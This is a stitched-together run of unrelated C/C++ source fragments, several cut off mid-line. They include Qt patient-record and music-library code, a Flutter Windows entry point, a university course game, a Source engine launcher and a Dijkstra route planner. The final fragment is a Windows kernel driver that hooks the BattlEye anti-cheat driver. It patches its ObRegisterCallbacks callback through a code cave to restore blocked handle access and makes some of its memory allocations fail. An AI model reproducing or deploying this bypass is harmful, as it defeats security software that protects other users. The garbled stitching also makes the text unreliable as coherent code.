admin::AddPatientRecord(QString toBeAddedID)\r\n{\r\n    QList<QString> userRecords = Retrieve(toBeAddedID);\r\n    QTextStream userInfo (&userRecords[0]);\r\n    QString diagnosis = userRecords[2];\r\n\r\n    QString name, id;\r\n\r\n    userInfo >> name >> id;\r\n\r\n    int index = ui->PatientDetailsTable->rowCount();\r\n    ui->PatientDetailsTable->insertRow(index);\r\n    ui->PatientDetailsTable->setItem(index,0,new QTableWidgetItem(name));\r\n    ui->PatientDetailsTable->setItem(index,1,new QTableWidgetItem(id));\r\n    ui->PatientDetailsTable->setItem(index,2,new QTableWidgetItem(diagnosis));\r\n    return;\r\n}\r\n\r\nvoid admin::on_pushButton_2_clicked(){\r\n\r\n};\r\nvoid admin::on_Assign_clicked()\r\n{\r\n    QString doctorname = this->ui->DoctorName->text();\r\n    QString nursename = this->ui->NurseName->text();\r\n    //nurses.push_back(std::make_pair(doctorname,nursename));\r\n     QFile file(\"C:\\\\Users\\\\kouss\\\\",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"myapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//=================================================================\r\n// The main program file.\r\n//\r\n// Copyright 2020 Georgia Tech.  All rights reserved.\r\n// The materials provided by the instructor in this course are for\r\n// the use of the students currently enrolled in the course.\r\n// Copyrighted course materials may not be further disseminated.\r\n// This file must not be made publicly available anywhere.\r\n//==================================================================\r\n\r\n// External libs\r\n#include <cstdio>\r\n#include <ctime>\r\n#include <stdlib.h>\r\n\r\n// Use these macros if you wanna read timer values\r\n#define timer_read_f(x)     chrono::duration<float>((x).elapsed_time()).count()\r\n#define timer_read_s(x)     chrono::duration_cast<chrono::seconds>((x).elapsed_time()).count()\r\n#define timer_read_ms(x)    chrono::duration_cast<chrono::milliseconds>((x).elapsed_time()).count()\r\n#define timer_read_us(x)    (x).elapsed_time().count()\r\n\r\n// Project includes\r\n//#include \"enemy_private.h\"\r\n#include \"globals.h\"\r\n#include \"hardware.h\"\r\n#include \"enemy_public.h\"\r\n#include \"player_public.h\"\r\n\r\n#define MENU_OPTIONS 5\r\n\r\n\r\n\r\n// ===User implementations start===\r\nint enemy_contact(void); // iterate through enemys and see if any collided\r\nint projectile_contact(void);   // see if any missiles have hit\r\nvoid set_random_seed(Timer);\r\nvoid game_over(char*);\r\nvoid start_menu(int, int, int);\r\nvoid pause_menu(int);\r\nvoid playSound(char*);\r\nint start_game();\r\nvoid load_game(char*);\r\nvoid save_game(int, int, int);\r\n\r\nint espeed = 4;\r\nint pspeed = 5;\r\nint gm = 0;\r\nint timeinc = 0;\r\nint d = 1;\r\nFILE* save;\r\n\r\n\r\n\r\nint main()\r\n{\r\n    GameInputs inputs; \r\n    // First things first: initialize hardware\r\n    ASSERT_P(hardware_init() == ERROR_NONE, \"Hardware init failed!\");\r\n    printf(\"Program Starting\\n\");\r\n    printf(\"mounting %d\\n\", fs.mount(&sd_block));\r\n\r\n    // ===User implementations start===\r\n    // Game state variables\r\n    // Timer to measure game update speed (secondarily used to generate random seed)\r\n\r\n    Timer gametime;\r\n    Timer t;\r\n    \r\n    int dt; // delta time\r\n    // set seed for random enemy generation\r\n    set_random_seed(t);\r\n\r\n    // REMEMBER TO CHANGE THIS FUNCTION WHEN CONTROLS ARE UPDATED-\r\n    int gamemode = start_game();       \r\n    printf(\"Initialization complete\\n\");\r\n    // uLCD.baudrate(3000000);\r\n    \r\n    /*\r\n\r\n    You will need to make helper methods to help out with the game objective\r\n    You should have methods that deal with drawing the missile, checking for missile contact,\r\n    checking for projectile contact, and any others as you see fit.\r\n\r\n    The shell code is just a guideline. You can edit the code in any way you see fir   \r\n       \r\n    \r\n    */\r\n\r\n    gametime.start();\r\n    int lasttime = 10;\r\n    uLCD.printf(\"Score: 0, Time:\");\r\n    char str [24];\r\n    while(1)\r\n    {\r\n        t.start();\r\n\r\n        // Draw enemys first\r\n        enemy_generator(espeed, pspeed);\r\n\r\n        //Put score on screen \r\n        \r\n        // NOTE: Text is 8 pixels tall\r\n        PLAYER player = player_get_info();\r\n        player_missile_draw(player.player_has_missile);\r\n        player_draw(0x0000FF);\r\n        \r\n        // read inputs\r\n        inputs = read_inputs();\r\n        if (inputs.down) {\r\n            player_moveDown();\r\n        } else if (inputs.up) {\r\n            player_moveUp();\r\n        } else if (inputs.left) {\r\n            player_moveLeft();\r\n        } else if (inputs.right) {\r\n            player_moveRight();\r\n        } else if (inputs.fire) {\r\n            player_throw();\r\n        }\r\n        // fill the rest of it out           \r\n        if (!player.player_has_missile) {\r\n            if (player.missile_boundingBox.topLeft.y > 8) {\r\n                player_move_missile();\r\n            } else {\r\n                player_missile_return();\r\n            }\r\n        }\r\n\r\n        // TODO: Write helper methods as needed  \r\n\r\n        \r\n        // TODO: Check if missile hit enemy\r\n        bool gameover = false;\r\n        LLNode* curr = get_enemy_list()->head;\r\n        while (curr != NULL) {\r\n            ENEMY* e = (ENEMY*) curr->data;\r\n            // check if this enemy is in contact with the player\r\n            if ((e->box.bottomRight.x >= player.x && e->box.bottomRight.y >= player.y &&\r\n                e->box.topLeft.x <= player.x && e->box.topLeft.y <= player.y) ||\r\n                (e->box.bottomRight.x >= player.x + PLAYER_SIZE && e->box.bottomRight.y >= player.y + player.height &&\r\n                e->box.topLeft.x <= player.x + PLAYER_SIZE && e->box.topLeft.y <= player.y + player.height) ||\r\n                (e->box.bottomRight.x >= player.x + PLAYER_SIZE && e->box.bottomRight.y >= player.y &&\r\n                e->box.topLeft.x <= player.x + PLAYER_SIZE && e->box.topLeft.y <= player.y) ||\r\n                (e->box.bottomRight.x >= player.x && e->box.bottomRight.y >= player.y + player.height &&\r\n                e->box.topLeft.x <= player.x && e->box.topLeft.y <= player.y + player.height)) {\r\n                    ga",
    "#include \"MusicRepertory.h\"\n#include \"JsonListConvertor.h\"\n\n#include <QJsonDocument>\n#include <QFile>\n\nMusicRepertory * MusicRepertory::_instance = nullptr;\n\nMusicRepertory *MusicRepertory::instance()\n{\n    if (_instance == nullptr) {\n        _instance = new MusicRepertory();\n    }\n    return _instance;\n}\n\nQList<MusicBase *> MusicRepertory::getList()\n{\n    return m_musicBaseList;\n}\n\nMusicBase *MusicRepertory::get(QString id)\n{\n    for (int i = 0; i < m_musicBaseList.count(); i++) {\n        if (m_musicBaseList.at(i)->getId() == id) {\n            return m_musicBaseList.at(i);\n        }\n    }\n\n    return nullptr;\n}\n\nvoid MusicRepertory::add(MusicBase *musicBase)\n{\n    if (musicBase == nullptr)\n        return;\n\n    musicBase->setId(generateRandomId());\n    m_musicBaseList.append(musicBase);\n    qDebug()<<musicBase->getPathName();\n    m_mediaPlayList->addMedia(QMediaContent(QUrl::fromLocalFile(musicBase->getPathName())));\n    this->save();\n}\n\nvoid MusicRepertory::remove(const QString &id)\n{\n    for (int i = 0; i < m_musicBaseList.count(); i++)\n    {\n        if (m_musicBaseList.at(i)->getId() == id)\n        {\n            m_musicBaseList.removeAt(i);\n            break;\n        }\n    }\n\n    this->save();\n}\n\nvoid MusicRepertory::update(MusicBase *musicBase)\n{\n    if (musicBase == nullptr)\n    {\n        return;\n    }\n\n    for (int i = 0; i < m_musicBaseList.count(); ++i)\n    {\n        MusicBase * oldMusicBase = m_musicBaseList.at(i);\n        if (oldMusicBase->getId() == musicBase->getId())\n        {\n            delete oldMusicBase;\n\n            m_musicBaseList.replace(i, musicBase);\n            break;\n        }\n    }\n\n    this->save();\n}\n\nQMediaPlaylist *MusicRepertory::getMediaPlayList()\n{\n    return m_mediaPlayList;\n}\n\nMusicRepertory::MusicRepertory()\n{\n    reload();\n\n    m_mediaPlayList = new QMediaPlaylist();\n    for (int i = 0; i < m_musicBaseList.count(); i++) {\n        MusicBase* musicBase = m_musicBaseList.at(i);\n        m_mediaPlayList->addMedia(QMediaContent(QUrl::fromLocalFile(musicBase->getPathName())));\n    }\n}\n\nvoid MusicRepertory::save()\n{\n    JsonListConvertor<MusicBase> convertor;\n    QJsonValue jsonValue = convertor.toJson(m_musicBaseList);\n\n    QFile saveFile(\"save.json\");\n    saveFile.open(QIODevice::WriteOnly);\n\n    QJsonObject jsonObj;\n    jsonObj.insert(\"musicInfoArray\", jsonValue.toArray());\n\n    QJsonDocument saveDoc(jsonObj);\n    saveFile.write(saveDoc.toJson());\n    saveFile.close();\n}\n\nvoid MusicRepertory::reload()\n{\n    QFile saveFile(\"save.json\");\n    saveFile.open(QIODevice::ReadOnly);\n\n    QByteArray saveData = saveFile.readAll();\n\n    QJsonDocument saveDoc(QJsonDocument::fromJson(saveData));\n\n    QJsonArray jsonList = saveDoc.object().value(\"musicInfoArray\").toArray();\n    JsonListConvertor<MusicBase> convertor;\n    m_musicBaseList = convertor.toList(jsonList);\n    saveFile.close();\n}\n\nQString MusicRepertory::generateRandomId()\n{\n    int randId = rand();\n    for (int i = 0; i < m_musicBaseList.count(); i++)\n    {\n        MusicBase* model = m_musicBaseList.at(i);\n        if (model->getId().toInt() == randId)\n            return generateRandomId();\n    }\n    return QString::number(randId);\n}\n",
    "//========= Copyright Valve Corporation, All rights reserved. ============//\r\n//\r\n// Purpose: \r\n//\r\n// Defines the entry point for the application.\r\n//\r\n//===========================================================================//\r\n\r\n#if defined( _WIN32 ) && !defined( _X360 )\r\n#include <windows.h>\r\n#include \"shlwapi.h\" // registry stuff\r\n#include <direct.h>\r\n#include <winreg.h>\r\n#elif defined(POSIX)\r\n\t#define O_EXLOCK 0\r\n\t#include <sys/types.h>\r\n\t#include <sys/stat.h>\r\n\t#include <fcntl.h>\r\n\t#include <locale.h>\r\n#elif defined ( _X360 )\r\n#else\r\n#error\r\n#endif\r\n#include \"appframework/ilaunchermgr.h\"\r\n#include <stdio.h>\r\n#include \"tier0/icommandline.h\"\r\n#include \"engine_launcher_api.h\"\r\n#include \"tier0/vcrmode.h\"\r\n#include \"ifilesystem.h\"\r\n#include \"tier1/interface.h\"\r\n#include \"tier0/dbg.h\"\r\n#include \"iregistry.h\"\r\n#include \"appframework/IAppSystem.h\"\r\n#include \"appframework/AppFramework.h\"\r\n#include <vgui/VGUI.h>\r\n#include <vgui/ISurface.h>\r\n#include \"tier0/platform.h\"\r\n#include \"tier0/memalloc.h\"\r\n#include \"filesystem.h\"\r\n#include \"tier1/utlrbtree.h\"\r\n#include \"materialsystem/imaterialsystem.h\"\r\n#include \"istudiorender.h\"\r\n#include \"vgui/IVGui.h\"\r\n#include \"IHammer.h\"\r\n#include \"datacache/idatacache.h\"\r\n#include \"datacache/imdlcache.h\"\r\n#include \"vphysics_interface.h\"\r\n#include \"filesystem_init.h\"\r\n#include \"vstdlib/iprocessutils.h\"\r\n#include \"video/ivideoservices.h\"\r\n#include \"tier1/tier1.h\"\r\n#include \"tier2/tier2.h\"\r\n#include \"tier3/tier3.h\"\r\n#include \"p4lib/ip4.h\"\r\n#include \"inputsystem/iinputsystem.h\"\r\n#include \"filesystem/IQueuedLoader.h\"\r\n#include \"reslistgenerator.h\"\r\n#include \"tier1/fmtstr.h\"\r\n#include \"sourcevr/isourcevirtualreality.h\"\r\n#include \"tier1/KeyValues.h\"\r\n#include \"tier0/basetypes.h\"\r\n\r\n#define VERSION_SAFE_STEAM_API_INTERFACES\r\n#include \"steam/steam_api.h\"\r\n\r\n#if defined( _X360 )\r\n#include \"xbox/xbox_win32stubs.h\"\r\n#include \"xbox/xbox_console.h\"\r\n#include \"xbox/xbox_launch.h\"\r\n#endif\r\n\r\n#if defined( USE_SDL )\r\n#include <SDL.h>\r\n#include <SDL_version.h>\r\n\r\n#if !defined( _WIN32 )\r\n#define MB_OK \t\t\t0x00000001\r\n#define MB_SYSTEMMODAL\t0x00000002\r\n#define MB_ICONERROR\t0x00000004\r\nint MessageBox( HWND hWnd, const char *message, const char *header, unsigned uType );\r\n#endif // _WIN32\r\n\r\n#endif // USE_SDL\r\n\r\n#if defined( POSIX )\r\n#define RELAUNCH_FILE \"/tmp/hl2_relaunch\"\r\n#endif\r\n\r\n#if defined ( ANDROID )\r\n#include <android/log.h>\r\n#include \"jni.h\"\r\n#endif\r\n\r\n// memdbgon must be the last include file in a .cpp file!!!\r\n#include \"tier0/memdbgon.h\"\r\n\r\n#define DEFAULT_HL2_GAMEDIR\t\"sourcebox_\" DEST_OS\r\n\r\n#if defined( USE_SDL )\r\nextern void* CreateSDLMgr();\r\n#endif\r\n\r\n//-----------------------------------------------------------------------------\r\n// Modules...\r\n//-----------------------------------------------------------------------------\r\nstatic IEngineAPI *g_pEngineAPI;\r\nstatic IHammer *g_pHammer;\r\n\r\nbool g_bTextMode = false;\r\nbool g_MultiRun = false;\r\n\r\nstatic char g_szBasedir[MAX_PATH];\r\nstatic char g_szGamedir[MAX_PATH];\r\n\r\n// copied from sys.h\r\nstruct FileAssociationInfo\r\n{\r\n\tchar const  *extension;\r\n\tchar const  *command_to_issue;\r\n};\r\n\r\nstatic FileAssociationInfo g_FileAssociations[] =\r\n{\r\n\t{ \".dem\", \"playdemo\" },\r\n\t{ \".sav\", \"load\" },\r\n\t{ \".bsp\", \"map\" },\r\n};\r\n\r\n#ifdef _WIN32\r\n#pragma warning(disable:4073)\r\n#pragma init_seg(lib)\r\n#endif\r\n\r\nclass CLeakDump\r\n{\r\npublic:\r\n\tCLeakDump()\r\n\t :\tm_bCheckLeaks( false )\r\n\t{\r\n\t}\r\n\r\n\t~CLeakDump()\r\n\t{\r\n\t\tif ( m_bCheckLeaks )\r\n\t\t{\r\n\t\t\tMemAlloc_DumpStats();\r\n\t\t}\r\n\t}\r\n\r\n\tbool m_bCheckLeaks;\r\n} g_LeakDump;\r\n\r\n//-----------------------------------------------------------------------------\r\n// Spew function!\r\n//-----------------------------------------------------------------------------\r\nSpewRetval_t LauncherDefaultSpewFunc( SpewType_t spewType, char const *pMsg )\r\n{\r\n#ifndef _CERT\r\n#ifdef WIN32\r\n\tOutputDebugStringA( pMsg );\r\n#else\r\n\tfprintf( stderr, \"%s\", pMsg );\r\n#endif\r\n\t\r\n\tswitch( spewType )\r\n\t{\r\n\tcase SPEW_MESSAGE:\r\n\tcase SPEW_LOG:\r\n\t\treturn SPEW_CONTINUE;\r\n\r\n\tcase SPEW_WARNING:\r\n\t\tif ( !stricmp( GetSpewOutputGroup(), \"init\" ) )\r\n\t\t{\r\n#if defined( WIN32 ) || defined( USE_SDL )\r\n\t\t\t::MessageBox( NULL, pMsg, \"Warning!\", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR );\r\n#endif\r\n\t\t}\r\n\t\treturn SPEW_CONTINUE;\r\n\r\n\tcase SPEW_ASSERT:\r\n\t\tif ( !ShouldUseNewAssertDialog() )\r\n\t\t{\r\n#if defined( WIN32 ) || defined( USE_SDL )\r\n\t\t\t::MessageBox( NULL, pMsg, \"Assert!\", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR );\r\n#endif\r\n\t\t}\r\n\t\treturn SPEW_DEBUGGER;\r\n\t\r\n\tcase SPEW_ERROR:\r\n\tdefault:\r\n#if defined( WIN32 ) || defined( USE_SDL )\r\n\t\t::MessageBox( NULL, pMsg, \"Error!\", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR );\r\n#endif\r\n\t\t_exit( 1 );\r\n\t}\r\n#else\r\n\tif ( spewType != SPEW_ERROR)\r\n\t\treturn SPEW_CONTINUE;\r\n\t_exit( 1 );\r\n#endif\r\n}\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Implementation of VCRHelpers.\r\n//-----------------------------------------------------------------------------\r\nclass CVCRHelpers : public IVCRHelpers\r\n{\r\npublic:\r\n\tvirtual void Erro",
    "#include <iostream>\n#include <vector>\n#include <oneapi/dpl/algorithm>\n#include <oneapi/dpl/tuple>\n#include <oneapi/dpl/iterator>\n\nint for_each_test1();\n\n\nint main()\n{\n\tstd::vector<float> A(100, 1);\n\tstd::vector<float> B(100, 2);\n\tstd::vector<float> C(100, 2);\n\n\tauto begin = oneapi::dpl::make_zip_iterator(A.begin(), B.begin(), C.begin());\n\tauto end   = oneapi::dpl::make_zip_iterator(A.end(), B.end(), C.end());\n\n\t// \u66f8\u304d\u63db\u3048\u304c\u3067\u304d\u308b\u304b\u306e\u78ba\u8a8d\n\toneapi::dpl::for_each(begin, end, [](auto t) {// & \u3092\u3044\u308c\u3061\u3083\u3060\u3081\uff01\n\t\tauto [a, b, c] = t;\n\t\ta = 20;\n\t\tb = 40;\n\t\tc = 30;\n\t});\n\n\t// \u51fa\u529b\u306e\u78ba\u8a8d\n\toneapi::dpl::for_each(begin, end, [](auto t) {// & \u3092\u3044\u308c\u3061\u3083\u3060\u3081\uff01\n\t\tauto [a, b, c] = t;\n\t\tstd::cout << \"(a,b,c) = (\" << a << \",\" << b << \",\" << c << \")\" << std::endl;\n\t\t});\n\n\n}\n\n/**\n* @brief for_each \u306e\u30c6\u30b9\u30c8\n*/\nint for_each_test1()\n{\n\tconst int N = 1000;\n\tstd::vector<float> A(N);\n\toneapi::dpl::for_each(A.begin(), A.end(), [](float& v) {v = 10.f; });\n\toneapi::dpl::for_each(A.begin(), A.end(), [](const float& v) {std::cout << v << std::endl; });\n}\n\n\n",
    "#include <bits/stdc++.h>\r\n#include <iostream>\r\n#include <queue>\r\n#include <stack>\r\n#define V 12\r\n#define m 999\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n//Stations\r\nint arr[V][V]=\r\n\t\t {\r\n\t\t\t {m, m, 1 ,m ,m, m, m, m, m, m, m, m},\r\n\t\t\t {m, m, 1, m, m, m, 1, m, m, m, m, m},\r\n\t\t\t {1, 1, m, 1, m, m, m, m, m, m, m, m},\r\n\t\t\t {m, m, 1, m, 1, 1, m, m, m, m, m, m},\r\n\t\t\t {m, m, m, 1, m, m, m, m, m, m, m, m},\r\n\t\t\t {m, m, m, 2, m, m, 3, 2, m, m, m, m},\r\n\t\t\t {m, 1, m, m, m, 1, m, m, m, m, m, m},\r\n\t\t\t {m, m, m, m, m, 1, m, m, 1, 1, m, m},\r\n\t\t\t {m, m, m, m, m, m, m, 1, m, m, m, m},\r\n\t\t\t {m, m, m, m, m, m, m, 1, m, m, 1, 1},\r\n\t\t\t {m, m, m, m, m, m, m, m, m, 1, m, m},\r\n\t\t\t {m, m, m, m, m, m, m, m, m, 1, m, m}\r\n\t\t};\r\n\t\t\r\n//Bus routes\t\t\r\nint busLocations[V][6]\r\n\t\t {\r\n\t         {0,1,0,0,0,0},\t\t \r\n\t         {1,0,0,0,1,1},\r\n\t         {0,1,0,0,1,1},\r\n\t         {0,1,1,1,1,1},\r\n\t         {0,0,1,0,1,0},\r\n\t\t\t {1,1,1,1,0,1},\r\n\t         {1,1,0,0,0,0},\r\n\t         {0,0,1,1,0,1},\r\n\t         {0,0,0,0,0,1},\r\n\t         {0,0,1,1,0,0},\r\n\t         {0,0,0,1,0,0},\r\n\t         {0,0,1,0,0,0},\r\n\t\t };\t \t\t \t\t\r\n\r\nclass dijkstra\r\n{\r\n\tprivate:\r\n//\tsource vertex:\r\n\tint src;\r\n//\tdestination vertex:\r\n\tint des;\r\n//\tarray to copy stations graph:\r\n\tint (*arr)[V];\r\n//\tarray to copy busses at vertices graph:\r\n\tint (*brr)[6];\r\n//\tvisited array for dijkstra shortest path:\r\n\tbool visited[V]; \r\n//\tdistance array for vertices in dijkstra:\r\n\tint dist[V];\r\n//\tarray storing shortest path vertices in string form:\r\n\tstring path[V];\r\n//\tarray storing shortest path vertices in integer form:\r\n\tint vis[V];\r\n//\tglobal stack used in priority method for message generation:\r\n\tstack<int> w;\r\n//\tuser route:\r\n\tstring tripPlan;\r\n//\tcount to store number of vertices crossed:\r\n\tint cCount;\r\n\r\n\tpublic:\r\n//\targument constructor:\r\n\tdijkstra(int a[V][V],int busLocations[V][6])\r\n\t{\r\n\t\t\tcCount=0;\r\n\t\t\tarr=a;\r\n\t\t\tbrr=busLocations;\r\n\t\t\tfor(int i=0;i<V;i++)\r\n\t\t\t{\r\n\t\t\t\tvisited[i]=false;\t\r\n\t\t\t\tpath[i]=\" \";\r\n\t\t\t}\r\n\t}\r\n//\tdijkstra algo implementation:\r\n\tvoid shortestPath(int x, int dest)\r\n\t{\r\n\t\tsrc=x;\r\n\t\tdes=dest;\r\n\t\tint point=x;\t\t\r\n\t\t\r\n\t\tfor(int i=0;i<V;i++)\r\n\t\t{\r\n//\tinitializing vis array to -1:\r\n\t\t\tvis[i]=-1;\r\n\t\t\tdist[i]=arr[x][i];\r\n\t\t\tif(arr[x][i]!=m)\r\n\t\t\t{\r\n//\tinitializing path array according to source vertex's connections:\r\n\t\t\t\tpath[i]=to_string(src)+\"->\"+to_string(i);\t\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tpath[i]=\"no path :(\";\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\twhile(allVisited()==false)\r\n\t\t{\r\n//\t\t\tfor first iteration of loop:\r\n\t\t\tif(point==x)\r\n\t\t\t{\r\n\t\r\n\t\t\t\tvisited[point]=true;\r\n//\t\t\t\tsetting current point to minimum distance vertex:\r\n\t\t\t\tpoint=minIndex(x);\r\n\t\t\t}\r\n//\t\t\tfor remaining iterations:\r\n\t\t\telse\r\n\t\t\t{\r\n\t\r\n\t\t\t\tfor(int i=0;i<V;i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(arr[point][i]+dist[point]<dist[i])\r\n\t\t\t\t\t{\r\n//\t\t\t\t\t\tupdating distance of each point from the source vertex:\r\n\t\t\t\t\t \tdist[i]=arr[point][i]+dist[point];\r\n//\t\t\t\t\t \tupdating path of each vertex from the source vertex:\r\n\t\t\t\t\t \tpath[i]=path[point]+\"->\"+to_string(i);\t \t\t\t\r\n\t\t\t\t\t}\t\t \t\r\n\t\t\t\t}\r\n//\t\t\t\tset the visited point to true;\r\n\t\t\t\tvisited[point]=true;\r\n//\t\t\t\tsetting current point to minimum distance vertex:\r\n\t\t\t\tpoint=minIndex(point);\r\n\t\t\t}\r\n//\t\t\tnext iteration of outer loop begins\r\n\t\t}\r\n//\t\tloop ends here\r\n\r\n//  string array of paths is generated in the above code\r\n\r\n//  now we extract the vertices from the string path to integer array\r\n//  for further use in priority and message methods:\r\n\t\tinitVis(dest); \r\n\t\tcout<<\"\\n\";\r\n//\t\tcall message generation method:\r\n\t\tmessage();\r\n\t\tcout<<\"\\n\";\r\n\t}\r\n//\thelper function to add balanced spaces in menu:\r\n\tvoid space(string x)\r\n\t{\r\n\t\tfor(int i=0;i<22-x.length();i++)\r\n\t\t{\r\n\t\t\tcout<<\" \";\r\n\t\t}\r\n\t}\r\n\t//\t\t private functions:\r\n\t\r\n//\tdistance of each point from source:\r\n\tprivate: void printdist()  //unused method\r\n\t{\r\n\t\tfor(int i=0;i<V;i++)\r\n\t\t{\r\n\t\t\tif(dist[i]==0)\r\n\t\t\t{\r\n\t\t\t\tcout<<src<<\" -> \"<<i<<\": \";\r\n\t\t\t\tcout<<\"infinite\"<<endl;\t\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tcout<<src<<\" -> \"<<i<<\": \";\r\n\t\t\t\tcout<<dist[i]<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\t//MIN INDEX\r\n\tint minIndex(int x)\r\n\t{\r\n\t\tint min =m, min_index;\r\n\t\tfor (int v = 0; v < V; v++)\r\n\t\t\tif (visited[v] == false && arr[x][v] <= min)\r\n\t\t\t\tmin = arr[x][v], min_index = v;\r\n\t\treturn min_index;\r\n\t}\r\n\t\r\n    //ALL VISITED\r\n\tbool allVisited()\r\n\t{\r\n\t\tfor(int i=0;i<V;i++)\r\n\t\t{\r\n\t\t\tif(visited[i]==false)\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n//\tprint station graph to confirm graph is correctly copied\r\n\tvoid printGraph()  //unused method\r\n\t{\r\n\t\t \tfor(int i=0;i<V;i++)\r\n\t\t\t {\r\n\t\t \t\tcout<<i <<\": \";\r\n\t\t \t\tfor(int j=0;j<V;j++)\r\n\t\t\t\t {\r\n\t\t \t\t\tcout<<arr[i][j]<<\"  \";\r\n\t\t\t\t }\r\n\t\t\t\t cout<<\"\\n\";\r\n\t\t\t }\r\n\t\t }\r\n\r\n//\t\t print boolean visited array:\r\n\tvoid printBool()   //unused method\r\n\t{\r\n\t\tfor(int i=0;i<V;i++)\r\n\t\t{\r\n\t\t \tcout<<i <<\": \";\r\n\t\t \tcout<<visited[i]<<\"  \";\r\n\t\t\tcout<<\"\\n\";\r\n\t\t}\r\n\t}\r\n\t\r\n\t\r\n\r\n\tvoid initVis(int j)\r\n\t{\r\n\t\tfor(int i=0;i<V;i++)\r\n\t\t{\r\n//\t\t\treach the destination vertex path:\r\n\t\t\tif(i==j)\r\n\t\t\t{\r\n//\t\t\t\tstarting index for global vis[V] array:\r\n\t\t\t\tint index=-1;\r\n\t\t\t\t for(int x=0;x<path[i].length()",
    "#include \"../Header Files/Includes.hpp\"\n\nstatic uint64_t _be_pre_ob_callback_cave = 0;\nstatic POB_PRE_OPERATION_CALLBACK _be_original_ob_callback = 0;\n\nOB_PREOP_CALLBACK_STATUS HookCallback(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)\n{\n\tauto result = _be_original_ob_callback(RegistrationContext, OperationInformation);\n\tOperationInformation->Parameters->CreateHandleInformation.DesiredAccess = OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess;\n\treturn result;\n}\n\nPVOID Hook_ExAllocatePool(POOL_TYPE PoolType, SIZE_T NumberOfBytes)\n{\n\tif (PoolType == 0x200 && NumberOfBytes == 0x1000 || PoolType == 0x200 && NumberOfBytes == 0x90)\n\t{\n\t\treturn 0;\n\t}\n\treturn ExAllocatePool(PoolType, NumberOfBytes);\n}\n\nNTSTATUS Hook_ObRegisterCallbacks(POB_CALLBACK_REGISTRATION callback_registration, PVOID* registration_handle)\n{\n\tDbgPrintEx(0, 0, \"[+] BE Called ObRegisterCallbacks\\n\");\n\n\t_be_original_ob_callback = callback_registration->OperationRegistration->PreOperation;\n\tPRTL_PROCESS_MODULES modules = Utils::GetModuleList();\n\tPVOID module_base{};\n\tPVOID module_size{};\n\n\tfor (ULONG i = 0; i < modules->NumberOfModules; i++)\n\t{\n\t\tPRTL_PROCESS_MODULE_INFORMATION module = &modules->Modules[i];\n\n\t\tif (!strstr((const char*)module->FullPathName, \"iorate\"))\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\t_be_pre_ob_callback_cave = Utils::find_codecave(module->ImageBase, 16);\n\n\t\tDbgPrintEx(0, 0, \"[+] Code Cave Address 0x%p\\n\", _be_pre_ob_callback_cave);\n\n\t\tif (_be_pre_ob_callback_cave != 0)\n\t\t{\n\t\t\tDbgPrintEx(0, 0, \"[+] Code Cave Inside %s\\n\", module->FullPathName);\n\n\t\t\tif (!Utils::patch_codecave_detour(_be_pre_ob_callback_cave, (uint64_t)&HookCallback))\n\t\t\t{\n\t\t\t\tDbgPrintEx(0, 0, \"[!] Failed To Patch Code Cave\\n\");\n\t\t\t\treturn STATUS_UNSUCCESSFUL;\n\t\t\t}\n\t\t\tcallback_registration->OperationRegistration->PreOperation = (POB_PRE_OPERATION_CALLBACK)_be_pre_ob_callback_cave;\n\t\t\tDbgPrintEx(0, 0, \"[+] Patched ObRegisterCallbacks\\n\");\n\t\t\tExFreePoolWithTag(modules, 0);\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn ObRegisterCallbacks(callback_registration, registration_handle);\n}\n\nPVOID Hook_MmGetSystemRoutineAddress(PUNICODE_STRING SystemRoutineName)\n{\n\tif (wcsstr(SystemRoutineName->Buffer, L\"ObRegisterCallbacks\"))\n\t{\n\t\treturn &Hook_ObRegisterCallbacks;\n\t}\n\telse if (wcsstr(SystemRoutineName->Buffer, L\"ExAllocatePool\"))\n\t{\n\t\treturn &Hook_ExAllocatePool;\n\t}\n\treturn MmGetSystemRoutineAddress(SystemRoutineName);\n}\n\nNTSTATUS DriverEntry(uint64_t mdl_ptr, uint64_t image_size)\n{\n\tPVOID be_module = NULL;\n\twhile (true)\n\t{\n\t\tbe_module = Utils::GetSystemModuleBase(L\"BEDaisy.sys\");\n\t\tif (be_module != NULL) break;\n\t}\n\tif (be_module)\n\t{\n\t\tDbgPrintEx(0, 0, \"[+] Found BEDaisy.sys -> %p\\n\", be_module);\n\t\tUtils::IATHook(be_module, \"MmGetSystemRoutineAddress\", &Hook_MmGetSystemRoutineAddress);\n\t}\n\treturn 